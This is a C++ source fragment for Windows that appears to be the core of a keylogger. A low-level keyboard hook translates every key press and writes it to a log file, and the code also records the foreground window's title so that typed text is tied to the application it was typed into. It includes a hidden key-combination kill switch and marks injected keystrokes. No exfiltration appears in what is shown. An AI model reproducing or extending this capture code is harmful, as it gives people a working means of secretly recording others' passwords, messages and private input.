std::wstring WindowTitle(HWND hwnd)
{
    if (!hwnd) return {};

    wchar_t title[512] = {};
    DWORD_PTR result = 0;

    // A hung foreground process must not stall the hook. SMTO_BLOCK means
    // SendMessageTimeout blocks the caller for at most the given timeout.
    if (!SendMessageTimeoutW(hwnd, WM_GETTEXT,
                             static_cast<WPARAM>(ARRAYSIZE(title)),
                             reinterpret_cast<LPARAM>(title),
                             SMTO_ABORTIFHUNG | SMTO_BLOCK,
                             50, &result))
        return {};

    return title;
}

void UpdateContext()
{
    HWND fg = GetForegroundWindow();
    if (!fg) return;

    const DWORD now = GetTickCount();
    const bool sameWindow = (fg == g_lastHwnd);
    if (sameWindow && (now - g_lastTitleTick) < 2000)
        return;

    g_lastHwnd      = fg;
    g_lastTitleTick = now;

    // Layout follows the foreground thread, so per-window layouts translate
    // correctly.
    DWORD tid = GetWindowThreadProcessId(fg, nullptr);
    if (tid) g_layout = GetKeyboardLayout(tid);

    std::wstring title = WindowTitle(fg);
    if (!title.empty() && title != g_lastTitle) {
        g_lastTitle = title;
        LogLine(L"== window: " + title + L" ==");
        if (g_log != INVALID_HANDLE_VALUE) FlushFileBuffers(g_log);
    }
}

void LogKeystroke(const std::wstring& text)
{
    if (text.empty()) return;
    LogLine(text);
}

// ---------------------------------------------------------------------------
//  Hook
// ---------------------------------------------------------------------------

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code != HC_ACTION)
        return CallNextHookEx(g_hook, code, wParam, lParam);

    if (wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN)
        return CallNextHookEx(g_hook, code, wParam, lParam);

    const KBDLLHOOKSTRUCT* kb = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);

    // Kill switch — swallowed so the host app never sees it.
    if (kb->vkCode == VK_F12 &&
        (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
        (GetAsyncKeyState(VK_MENU)    & 0x8000) &&
        (GetAsyncKeyState(VK_SHIFT)   & 0x8000))
    {
        PostQuitMessage(0);
        return 1;
    }

    UpdateContext();

    const bool injected = (kb->flags & LLKHF_INJECTED) != 0;
    std::wstring text = TranslateKey(kb->vkCode, kb->scanCode);
    if (!text.empty()) {
        if (injected) text = L"<inj>" + text;
        LogKeystroke(text);
    }

    return CallNextHookEx(g_hook, code, wParam, lParam);
}

